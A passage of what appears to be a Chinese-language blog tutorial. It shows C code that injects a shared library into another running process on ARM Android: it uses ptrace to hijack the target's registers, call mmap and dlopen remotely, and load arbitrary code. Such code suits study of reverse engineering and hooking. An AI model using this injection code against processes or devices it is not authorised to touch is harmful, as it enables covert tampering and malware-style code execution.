class="line"></span><br><span class="line"><span class="comment">/*************************************************</span></span><br><span class="line"><span class="comment">  Description:    使用ptrace设置远程进程的寄存器值</span></span><br><span class="line"><span class="comment">  Input:          pid表示远程进程的ID，regs为pt_regs结构，存储需要修改的寄存器值</span></span><br><span class="line"><span class="comment">  Output:         无</span></span><br><span class="line"><span class="comment">  Return:         返回0表示设置寄存器成功，返回-1表示失败</span></span><br><span class="line"><span class="comment">  Others:         无</span></span><br><span class="line"><span class="comment">*************************************************/</span> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">ptrace_setregs</span><span class="params">(<span class="keyword">pid_t</span> pid, struct pt_regs *regs)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (ptrace(PTRACE_SETREGS, pid, <span class="literal">NULL</span>, regs) &lt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">LOGD(<span class="string">"Set Regs error, pid:%d"</span>, pid);</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*************************************************</span></span><br><span class="line"><span class="comment">  Description:    获取返回值，ARM处理器中返回值存放在ARM_r0寄存器中</span></span><br><span class="line"><span class="comment">  Input:          regs存储远程进程当前的寄存器值</span></span><br><span class="line"><span class="comment">  Output:         无</span></span><br><span class="line"><span class="comment">  Return:         在ARM处理器下返回r0寄存器值</span></span><br><span class="line"><span class="comment">  Others:         无</span></span><br><span class="line"><span class="comment">*************************************************/</span> </span><br><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">ptrace_getret</span><span class="params">(struct pt_regs * regs)</span>    </span></span><br><span class="line"><span class="function"></span>&#123;       </span><br><span class="line">    <span class="keyword">return</span> regs-&gt;ARM_r0;      </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*************************************************</span></span><br><span class="line"><span class="comment">  Description:    获取当前执行代码的地址，ARM处理器下存放在ARM_pc中</span></span><br><span class="line"><span class="comment">  Input:          regs存储远程进程当前的寄存器值</span></span><br><span class="line"><span class="comment">  Output:         无</span></span><br><span class="line"><span class="comment">  Return:         在ARM处理器下返回pc寄存器值</span></span><br><span class="line"><span class="comment">  Others:         无</span></span><br><span class="line"><span class="comment">*************************************************/</span> </span><br><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">ptrace_getpc</span><span class="params">(struct pt_regs * regs)</span>    </span></span><br><span class="line"><span class="function"></span>&#123;       </span><br><span class="line">    <span class="keyword">return</span> regs-&gt;ARM_pc;    </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="comment">/*************************************************</span></span><br><span class="line"><span class="comment">  Description:    使用ptrace从远程进程内存中读取数据</span></span><br><span class="line"><span class="comment">  Input:          pid表示远程进程的ID，pSrcBuf表示从远程进程读取数据的内存地址</span></span><br><span class="line"><span class="comment">  pDestBuf表示用于存储读取出数据的地址，size表示读取数据的大小</span></span><br><span class="line"><span class="comment">  Output:         无</span></span><br><span class="line"><span class="comment">  Return:         返回0表示读取数据成功</span></span><br><span class="line"><span class="comment">  Others:         无</span></span><br><span class="line"><span class="comment">*************************************************/</span> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">ptrace_readdata</span><span class="params">(<span class="keyword">pid_t</span> pid, <span class="keyword">uint8_t</span> *pSrcBuf, <span class="keyword">uint8_t</span> *pDestBuf, <span class="keyword">uint32_t</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">uint32_t</span> nReadCount = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">uint32_t</span> nRemainCount = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">uint8_t</span> *pCurSrcBuf = pSrcBuf;</span><br><span class="line"><span class="keyword">uint8_t</span> *pCurDestBuf = pDestBuf;</span><br><span class="line"><span class="keyword">long</span> lTmpBuf = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">uint32_t</span> i = <span class="number">0</span>;</span><br><span class="line"> </span><br><span class="line">nReadCount = size / <span class="keyword">sizeof</span>(<span class="keyword">long</span>);</span><br><span class="line">nRemainCount = size % <span class="keyword">sizeof</span>(<span class="keyword">long</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; nReadCount; i ++ )</span><br><span class="line">&#123;</span><br><span class="line">lTmpBuf = ptrace(PTRACE_PEEKTEXT, pid, pCurSrcBuf, <span class="number">0</span>);</span><br><span class="line"><span class="built_in">memcpy</span>(pCurDestBuf, (<span class="keyword">char</span> *)(&amp;lTmpBuf), <span class="keyword">sizeof</span>(<span class="keyword">long</span>));</span><br><span class="line">pCurSrcBuf += <span class="keyword">sizeof</span>(<span class="keyword">long</span>);</span><br><span class="line">pCurDestBuf += <span class="keyword">sizeof</span>(<span class="keyword">long</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( nRemainCount &gt; <span class="number">0</span> )</span><br><span class="line">&#123;</span><br><span class="line">lTmpBuf = ptrace(PTRACE_PEEKTEXT, pid, pCurSrcBuf, <span class="number">0</span>);</span><br><span class="line"><span class="built_in">memcpy</span>(pCurDestBuf, (<span class="keyword">char</span> *)(&amp;lTmpBuf), nRemainCount);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// </span></span><br><span class="line"><span class="comment">/*************************************************</span></span><br><span class="line"><span class="comment">  Description:    使用ptrace将数据写入到远程进程空间中</span></span><br><span class="line"><span class="comment">  Input:          pid表示远程进程的ID，pWriteAddr表示写入数据到远程进程的内存地址</span></span><br><span class="line"><span class="comment">  pWriteData用于存储写入数据的地址，size表示写入数据的大小</span></span><br><span class="line"><span class="comment">  Output:         无</span></span><br><span class="line"><span class="comment">  Return:         返回0表示写入数据成功，返回-1表示写入数据失败</span></span><br><span class="line"><span class="comment">  Others:         无</span></span><br><span class="line"><span class="comment">*************************************************/</span> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">ptrace_writedata</span><span class="params">(<span class="keyword">pid_t</span> pid, <span class="keyword">uint8_t</span> *pWriteAddr, <span class="keyword">uint8_t</span> *pWriteData, <span class="keyword">uint32_t</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">uint32_t</span> nWriteCount = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">uint32_t</span> nRemainCount = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">uint8_t</span> *pCurSrcBuf = pWriteData;</span><br><span class="line"><span class="keyword">uint8_t</span> *pCurDestBuf = pWriteAddr;</span><br><span class="line"><span class="keyword">long</span> lTmpBuf = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">uint32_t</span> i = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">nWriteCount = size / <span class="keyword">sizeof</span>(<span class="keyword">long</span>);</span><br><span class="line">nRemainCount = size % <span class="keyword">sizeof</span>(<span class="keyword">long</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 先讲数据以sizeof(long)字节大小为单位写入到远程进程内存空间中</span></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; nWriteCount; i ++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">memcpy</span>((<span class="keyword">void</span> *)(&amp;lTmpBuf), pCurSrcBuf, <span class="keyword">sizeof</span>(<span class="keyword">long</span>));</span><br><span class="line"><span class="keyword">if</span> (ptrace(PTRACE_POKETEXT, pid, pCurDestBuf, lTmpBuf) &lt; <span class="number">0</span>)  <span class="comment">// PTRACE_POKETEXT表示从远程内存空间写入一个sizeof(long)大小的数据</span></span><br><span class="line">&#123;</span><br><span class="line">LOGD(<span class="string">"Write Remote Memory error, MemoryAddr:0x%lx"</span>, (<span class="keyword">long</span>)pCurDestBuf);</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line">pCurSrcBuf += <span class="keyword">sizeof</span>(<span class="keyword">long</span>);</span><br><span class="line">pCurDestBuf += <span class="keyword">sizeof</span>(<span class="keyword">long</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将剩下的数据写入到远程进程内存空间中</span></span><br><span class="line"><span class="keyword">if</span> (nRemainCount &gt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">lTmpBuf = ptrace(PTRACE_PEEKTEXT, pid, pCurDestBuf, <span class="literal">NULL</span>); <span class="comment">//先取出原内存中的数据，然后将要写入的数据以单字节形式填充到低字节处</span></span><br><span class="line"><span class="built_in">memcpy</span>((<span class="keyword">void</span> *)(&amp;lTmpBuf), pCurSrcBuf, nRemainCount);</span><br><span class="line"><span class="keyword">if</span> (ptrace(PTRACE_POKETEXT, pid, pCurDestBuf, lTmpBuf) &lt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">LOGD(<span class="string">"Write Remote Memory error, MemoryAddr:0x%lx"</span>, (<span class="keyword">long</span>)pCurDestBuf);</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*************************************************</span></span><br><span class="line"><span class="comment">  Description:    使用ptrace远程call函数</span></span><br><span class="line"><span class="comment">  Input:          pid表示远程进程的ID，ExecuteAddr为远程进程函数的地址</span></span><br><span class="line"><span class="comment">                  parameters为函数参数的地址，regs为远程进程call函数前的寄存器环境</span></span><br><span class="line"><span class="comment">  Output:         无</span></span><br><span class="line"><span class="comment">  Return:         返回0表示call函数成功，返回-1表示失败</span></span><br><span class="line"><span class="comment">  Others:         无</span></span><br><span class="line"><span class="comment">*************************************************/</span> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">ptrace_call</span><span class="params">(<span class="keyword">pid_t</span> pid, <span class="keyword">uint32_t</span> ExecuteAddr, <span class="keyword">long</span> *parameters, <span class="keyword">long</span> num_params, struct pt_regs* regs)</span>    </span></span><br><span class="line"><span class="function"></span>&#123;    </span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line"><span class="comment">// ARM处理器，函数传递参数，将前四个参数放到r0-r3，剩下的参数压入栈中</span></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; num_params &amp;&amp; i &lt; <span class="number">4</span>; i ++) &#123;    </span><br><span class="line">        regs-&gt;uregs[i] = parameters[i];    </span><br><span class="line">    &#125;    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (i &lt; num_params) &#123;    </span><br><span class="line">        regs-&gt;ARM_sp -= (num_params - i) * <span class="keyword">sizeof</span>(<span class="keyword">long</span>) ;    <span class="comment">// 分配栈空间，栈的方向是从高地址到低地址</span></span><br><span class="line">        <span class="keyword">if</span> (ptrace_writedata(pid, (<span class="keyword">void</span> *)regs-&gt;ARM_sp, (<span class="keyword">uint8_t</span> *)&amp;parameters[i], (num_params - i) * <span class="keyword">sizeof</span>(<span class="keyword">long</span>))  == <span class="number">-1</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;    </span><br><span class="line">    </span><br><span class="line">    regs-&gt;ARM_pc = ExecuteAddr;           <span class="comment">//设置ARM_pc寄存器为需要调用的函数地址</span></span><br><span class="line">    <span class="comment">// 与BX跳转指令类似，判断跳转的地址位[0]是否为1，如果为1，则将CPST寄存器的标志T置位，解释为Thumb代码</span></span><br><span class="line"><span class="comment">// 若为0，则将CPSR寄存器的标志T复位，解释为ARM代码</span></span><br><span class="line"><span class="keyword">if</span> (regs-&gt;ARM_pc &amp; <span class="number">1</span>) &#123;    </span><br><span class="line">        <span class="comment">/* thumb */</span>    </span><br><span class="line">        regs-&gt;ARM_pc &amp;= (~<span class="number">1u</span>);    </span><br><span class="line">        regs-&gt;ARM_cpsr |= CPSR_T_MASK;    </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;    </span><br><span class="line">        <span class="comment">/* arm */</span>    </span><br><span class="line">        regs-&gt;ARM_cpsr &amp;= ~CPSR_T_MASK;    </span><br><span class="line">    &#125;    </span><br><span class="line">    </span><br><span class="line">    regs-&gt;ARM_lr = <span class="number">0</span>;        </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (ptrace_setregs(pid, regs) == <span class="number">-1</span> || ptrace_continue(pid) == <span class="number">-1</span>) &#123;    </span><br><span class="line">        LOGD(<span class="string">"ptrace set regs or continue error, pid:%d"</span>, pid);  </span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;    </span><br><span class="line">    &#125;    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">int</span> stat = <span class="number">0</span>;  </span><br><span class="line"><span class="comment">// 对于使用ptrace_cont运行的子进程，它会在3种情况下进入暂停状态：①下一次系统调用；②子进程退出；③子进程的执行发生错误。</span></span><br><span class="line"><span class="comment">// 参数WUNTRACED表示当进程进入暂停状态后，立即返回</span></span><br><span class="line"><span class="comment">// 将ARM_lr（存放返回地址）设置为0，会导致子进程执行发生错误，则子进程进入暂停状态</span></span><br><span class="line">    waitpid(pid, &amp;stat, WUNTRACED);  </span><br><span class="line">    </span><br><span class="line"><span class="comment">// 判断是否成功执行函数</span></span><br><span class="line">    LOGD(<span class="string">"ptrace call ret status is %d\n"</span>, stat); </span><br><span class="line">    <span class="keyword">while</span> (stat != <span class="number">0xb7f</span>) &#123;  </span><br><span class="line">        <span class="keyword">if</span> (ptrace_continue(pid) == <span class="number">-1</span>) &#123;  </span><br><span class="line">            LOGD(<span class="string">"ptrace call error"</span>);  </span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;  </span><br><span class="line">        &#125;  </span><br><span class="line">        waitpid(pid, &amp;stat, WUNTRACED);  </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取远程进程的寄存器值，方便获取返回值</span></span><br><span class="line"><span class="keyword">if</span> (ptrace_getregs(pid, regs) == <span class="number">-1</span>)</span><br><span class="line">&#123;</span><br><span class="line">LOGD(<span class="string">"After call getregs error"</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;    </span><br><span class="line">&#125;    </span><br><span class="line"></span><br><span class="line"><span class="comment">/*************************************************</span></span><br><span class="line"><span class="comment">  Description:    在指定进程中搜索对应模块的基址</span></span><br><span class="line"><span class="comment">  Input:          pid表示远程进程的ID，若为-1表示自身进程，ModuleName表示要搜索的模块的名称</span></span><br><span class="line"><span class="comment">  Output:         无</span></span><br><span class="line"><span class="comment">  Return:         返回0表示获取模块基址失败，返回非0为要搜索的模块基址</span></span><br><span class="line"><span class="comment">  Others:         无</span></span><br><span class="line"><span class="comment">*************************************************/</span> </span><br><span class="line"><span class="function"><span class="keyword">void</span>* <span class="title">GetModuleBaseAddr</span><span class="params">(<span class="keyword">pid_t</span> pid, <span class="keyword">const</span> <span class="keyword">char</span>* ModuleName)</span>    </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    FILE *fp = <span class="literal">NULL</span>;    </span><br><span class="line">    <span class="keyword">long</span> ModuleBaseAddr = <span class="number">0</span>; </span><br><span class="line"><span class="keyword">char</span> *ModulePath, *MapFileLineItem;</span><br><span class="line">    <span class="keyword">char</span> szFileName[<span class="number">50</span>] = &#123;<span class="number">0</span>&#125;;    </span><br><span class="line">    <span class="keyword">char</span> szMapFileLine[<span class="number">1024</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">char</span> szProcessInfo[<span class="number">1024</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    </span><br><span class="line"><span class="comment">// 读取"/proc/pid/maps"可以获得该进程加载的模块</span></span><br><span class="line">    <span class="keyword">if</span> (pid &lt; <span class="number">0</span>) &#123;    </span><br><span class="line">        <span class="comment">//  枚举自身进程模块 </span></span><br><span class="line">        <span class="built_in">snprintf</span>(szFileName, <span class="keyword">sizeof</span>(szFileName), <span class="string">"/proc/self/maps"</span>);    </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;    </span><br><span class="line">        <span class="built_in">snprintf</span>(szFileName, <span class="keyword">sizeof</span>(szFileName), <span class="string">"/proc/%d/maps"</span>, pid);    </span><br><span class="line">    &#125;    </span><br><span class="line">    </span><br><span class="line">    fp = fopen(szFileName, <span class="string">"r"</span>);    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (fp != <span class="literal">NULL</span>) </span><br><span class="line">&#123;    </span><br><span class="line">        <span class="keyword">while</span> (fgets(szMapFileLine, <span class="keyword">sizeof</span>(szMapFileLine), fp)) &#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">strstr</span>(szMapFileLine, ModuleName))</span><br><span class="line">&#123;</span><br><span class="line">MapFileLineItem = strtok(szMapFileLine, <span class="string">" \t"</span>); <span class="comment">// 基址信息</span></span><br><span class="line">                <span class="keyword">char</span> *Addr = strtok(szMapFileLine, <span class="string">"-"</span>);    </span><br><span class="line">                ModuleBaseAddr = strtoul(Addr, <span class="literal">NULL</span>, <span class="number">16</span> );    </span><br><span class="line">    </span><br><span class="line">                <span class="keyword">if</span> (ModuleBaseAddr == <span class="number">0x8000</span>)    </span><br><span class="line">                    ModuleBaseAddr = <span class="number">0</span>;    </span><br><span class="line">    </span><br><span class="line">                <span class="keyword">break</span>;   </span><br><span class="line">&#125;</span><br><span class="line">        &#125;    </span><br><span class="line">    </span><br><span class="line">        fclose(fp) ;    </span><br><span class="line">    &#125;    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">void</span> *)ModuleBaseAddr;       </span><br><span class="line">&#125;    </span><br><span class="line"></span><br><span class="line"><span class="comment">/*************************************************</span></span><br><span class="line"><span class="comment">  Description:    获取远程进程与本进程都加载的模块中函数的地址</span></span><br><span class="line"><span class="comment">  Input:          pid表示远程进程的ID，ModuleName表示模块名称，LocalFuncAddr表示本地进程中该函数的地址</span></span><br><span class="line"><span class="comment">  Output:         无</span></span><br><span class="line"><span class="comment">  Return:         返回远程进程中对应函数的地址</span></span><br><span class="line"><span class="comment">  Others:         无</span></span><br><span class="line"><span class="comment">*************************************************/</span> </span><br><span class="line"><span class="function"><span class="keyword">void</span>* <span class="title">GetRemoteFuncAddr</span><span class="params">(<span class="keyword">pid_t</span> pid, <span class="keyword">const</span> <span class="keyword">char</span> *ModuleName, <span class="keyword">void</span> *LocalFuncAddr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">void</span> *LocalModuleAddr, *RemoteModuleAddr, *RemoteFuncAddr;</span><br><span class="line"></span><br><span class="line">LocalModuleAddr = GetModuleBaseAddr(<span class="number">-1</span>, ModuleName);</span><br><span class="line">RemoteModuleAddr = GetModuleBaseAddr(pid, ModuleName);</span><br><span class="line"></span><br><span class="line">RemoteFuncAddr = (<span class="keyword">void</span> *)((<span class="keyword">long</span>)LocalFuncAddr - (<span class="keyword">long</span>)LocalModuleAddr + (<span class="keyword">long</span>)RemoteModuleAddr);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> RemoteFuncAddr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*************************************************</span></span><br><span class="line"><span class="comment">  Description:    通过远程直接调用dlopen\dlsym的方法ptrace注入so模块到远程进程中</span></span><br><span class="line"><span class="comment">  Input:          pid表示远程进程的ID，LibPath为被远程注入的so模块路径，FunctionName为远程注入的模块后调用的函数</span></span><br><span class="line"><span class="comment">  FuncParameter指向被远程调用函数的参数（若传递字符串，需要先将字符串写入到远程进程空间中），NumParameter为参数的个数</span></span><br><span class="line"><span class="comment">  Output:         无</span></span><br><span class="line"><span class="comment">  Return:         返回0表示注入成功，返回-1表示失败</span></span><br><span class="line"><span class="comment">  Others:         无</span></span><br><span class="line"><span class="comment">*************************************************/</span> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">inject_remote_process</span><span class="params">(<span class="keyword">pid_t</span> pid, <span class="keyword">char</span> *LibPath, <span class="keyword">char</span> *FunctionName, <span class="keyword">long</span> *FuncParameter, <span class="keyword">long</span> NumParameter)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> iRet = <span class="number">-1</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pt_regs</span> <span class="title">CurrentRegs</span>, <span class="title">OriginalRegs</span>;</span>  <span class="comment">// CurrentRegs表示远程进程中当前的寄存器值，OriginalRegs存储注入前的寄存器值，方便恢复</span></span><br><span class="line"><span class="keyword">void</span> *mmap_addr, *dlopen_addr, *dlsym_addr, *dlclose_addr, *dlerror_addr;   <span class="comment">// 远程进程中需要调用函数的地址</span></span><br><span class="line"><span class="keyword">void</span> *RemoteMapMemoryAddr, *RemoteModuleAddr, *RemoteModuleFuncAddr; <span class="comment">// RemoteMapMemoryAddr为远程进程空间中映射的内存基址，RemoteModuleAddr为远程注入的so模块加载基址，RemoteModuleFuncAddr为注入模块中需要调用的函数地址</span></span><br><span class="line"><span class="keyword">long</span> parameters[<span class="number">6</span>];  </span><br><span class="line"></span><br><span class="line"><span class="comment">// Attach远程进程</span></span><br><span class="line"><span class="keyword">if</span> (ptrace_attach(pid) == <span class="number">-1</span>)</span><br><span class="line"><span class="keyword">return</span> iRet;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取远程进程的寄存器值</span></span><br><span class="line"><span class="keyword">if</span> (ptrace_getregs(pid, &amp;CurrentRegs) == <span class="number">-1</span>)</span><br><span class="line">&#123;</span><br><span class="line">ptrace_detach(pid);</span><br><span class="line"><span class="keyword">return</span> iRet;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">LOGD(<span class="string">"ARM_r0:0x%lx, ARM_r1:0x%lx, ARM_r2:0x%lx, ARM_r3:0x%lx, ARM_r4:0x%lx, ARM_r5:0x%lx, ARM_r6:0x%lx, ARM_r7:0x%lx, ARM_r8:0x%lx, ARM_r9:0x%lx, ARM_r10:0x%lx, ARM_ip:0x%lx, ARM_sp:0x%lx, ARM_lr:0x%lx, ARM_pc:0x%lx"</span>, \</span><br><span class="line">CurrentRegs.ARM_r0, CurrentRegs.ARM_r1, CurrentRegs.ARM_r2, CurrentRegs.ARM_r3, CurrentRegs.ARM_r4, CurrentRegs.ARM_r5, CurrentRegs.ARM_r6, CurrentRegs.ARM_r7, CurrentRegs.ARM_r8, CurrentRegs.ARM_r9, CurrentRegs.ARM_r10, CurrentRegs.ARM_ip, CurrentRegs.ARM_sp, CurrentRegs.ARM_lr, CurrentRegs.ARM_pc);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 保存远程进程空间中当前的上下文寄存器环境</span></span><br><span class="line"><span class="built_in">memcpy</span>(&amp;OriginalRegs, &amp;CurrentRegs, <span class="keyword">sizeof</span>(CurrentRegs)); </span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取mmap函数在远程进程中的地址</span></span><br><span class="line">mmap_addr = GetRemoteFuncAddr(pid, libc_path, (<span class="keyword">void</span> *)mmap);</span><br><span class="line">LOGD(<span class="string">"mmap RemoteFuncAddr:0x%lx"</span>, (<span class="keyword">long</span>)mmap_addr);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置mmap的参数</span></span><br><span class="line"><span class="comment">// void *mmap(void *start, size_t length, int prot, int flags, int fd, off_t offsize);</span></span><br><span class="line">    parameters[<span class="number">0</span>] = <span class="number">0</span>;  <span class="comment">// 设置为NULL表示让系统自动选择分配内存的地址    </span></span><br><span class="line">    parameters[<span class="number">1</span>] = <span class="number">0x1000</span>; <span class="comment">// 映射内存的大小    </span></span><br><span class="line">    parameters[<span class="number">2</span>] = PROT_READ | PROT_WRITE | PROT_EXEC;  <span class="comment">// 表示映射内存区域可读可写可执行   </span></span><br><span class="line">    parameters[<span class="number">3</span>] =  MAP_ANONYMOUS | MAP_PRIVATE; <span class="comment">// 建立匿名映射    </span></span><br><span class="line">    parameters[<span class="number">4</span>] = <span class="number">0</span>; <span class="comment">//  若需要映射文件到内存中，则为文件的fd  </span></span><br><span class="line">    parameters[<span class="number">5</span>] = <span class="number">0</span>; <span class="comment">//文件映射偏移量 </span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 调用远程进程的mmap函数，建立远程进程的内存映射</span></span><br><span class="line"><span class="keyword">if</span> (ptrace_call(pid, (<span class="keyword">long</span>)mmap_addr, parameters, <span class="number">6</span>, &amp;CurrentRegs) == <span class="number">-1</span>)</span><br><span class="line">&#123;</span><br><span class="line">LOGD(<span class="string">"Call Remote mmap Func Failed"</span>);</span><br><span class="line">ptrace_detach(pid);</span><br><span class="line"><span class="keyword">return</span> iRet;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取mmap函数执行后的返回值，也就是内存映射的起始地址</span></span><br><span class="line">RemoteMapMemoryAddr = (<span class="keyword">void</span> *)ptrace_getret(&amp;CurrentRegs);</span><br><span class="line">LOGD(<span class="string">"Remote Process Map Memory Addr:0x%lx"</span>, (<span class="keyword">long</span>)RemoteMapMemoryAddr);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 分别获取dlopen、dlsym、dlclose等函数的地址</span></span><br><span class="line">dlopen_addr = GetRemoteFuncAddr(pid, linker_path, (<span class="keyword">void</span> *)dlopen);</span><br><span class="line">dlsym_addr = GetRemoteFuncAddr(pid, linker_path, (<span class="keyword">void</span> *)dlsym);</span><br><span class="line">dlclose_addr = GetRemoteFuncAddr(pid, linker_path, (<span class="keyword">void</span> *)dlclose);</span><br><span class="line">dlerror_addr = GetRemoteFuncAddr(pid, linker_path, (<span class="keyword">void</span> *)dlerror);</span><br><span class="line"></span><br><span class="line">LOGD(<span class="string">"dlopen RemoteFuncAddr:0x%lx"</span>, (<span class="keyword">long</span>)dlopen_addr);</span><br><span class="line">LOGD(<span class="string">"dlsym RemoteFuncAddr:0x%lx"</span>, (<span class="keyword">long</span>)dlsym_addr);</span><br><span class="line">LOGD(<span class="string">"dlclose RemoteFuncAddr:0x%lx"</span>, (<span class="keyword">long</span>)dlclose_addr);</span><br><span class="line">LOGD(<span class="string">"dlerror RemoteFuncAddr:0x%lx"</span>, (<span class="keyword">long</span>)dlerror_addr);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将要加载的so库路径写入到远程进程内存空间中</span></span><br><span class="line"><span class="keyword">if</span> (ptrace_writedata(pid, RemoteMapMemoryAddr, LibPath, <span class="built_in">strlen</span>(LibPath) + <span class="number">1</span>) == <span class="number">-1</span>)</span><br><span class="line">&#123;</span><br><span class="line">LOGD(<span class="string">"Write LibPath:%s to RemoteProcess error"</span>, LibPath);</span><br><span class="line">ptrace_detach(pid);</span><br><span class="line"><span class="keyword">return</span> iRet;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置dlopen的参数,返回值为模块加载的地址</span></span><br><span class="line"><span class="comment">// void *dlopen(const char *filename, int flag);</span></span><br><span class="line">parameters[<span class="number">0</span>] = (<span class="keyword">long</span>)RemoteMapMemoryAddr;</span><br><span class="line">parameters[<span class="number">1</span>] = RTLD_NOW| RTLD_GLOBAL;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (ptrace_call(pid, (<span class="keyword">long</span>)dlopen_addr, parameters, <span class="number">2</span>, &amp;CurrentRegs) == <span class="number">-1</span>)</span><br><span class="line">&#123;</span><br><span class="line">LOGD(<span class="string">"Call Remote dlopen Func Failed"</span>);</span><br><span class="line">ptrace_detach(pid);</span><br><span class="line"><span class="keyword">return</span> iRet;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// RemoteModuleAddr为远程进程加载注入模块的地址</span></span><br><span class="line">RemoteModuleAddr = (<span class="keyword">void</span> *)ptrace_getret(&amp;CurrentRegs);</span><br><span class="line">LOGD(<span class="string">"Remote Process load module Addr:0x%lx"</span>, (<span class="keyword">long</span>)RemoteModuleAddr);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((<span class="keyword">long</span>)RemoteModuleAddr == <span class="number">0x0</span>)   <span class="comment">// dlopen 错误</span></span><br><span class="line">&#123;</span><br><span class="line">LOGD(<span class="string">"dlopen error"</span>);</span><br><span class="line"><span class="keyword">if</span> (ptrace_call(pid, (<span class="keyword">long</span>)dlerror_addr, parameters, <span class="number">0</span>, &amp;CurrentRegs) == <span class="number">-1</span>)</span><br><span class="line">&#123;</span><br><span class="line">LOGD(<span class="string">"Call Remote dlerror Func Failed"</span>);</span><br><span class="line">ptrace_detach(pid);</span><br><span class="line"><span class="keyword">return</span> iRet;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">char</span> *Error = (<span class="keyword">void</span> *)ptrace_getret(&amp;CurrentRegs);</span><br><span class="line"><span class="keyword">char</span> LocalErrorInfo[<span class="number">1024</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">ptrace_readdata(pid, Error, LocalErrorInfo, <span class="number">1024</span>);</span><br><span class="line">LOGD(<span class="string">"dlopen error:%s"</span>, LocalErrorInfo);</span><br><span class="line">ptrace_detach(pid);</span><br><span class="line"><span class="keyword">return</span> iRet;</span><br><span 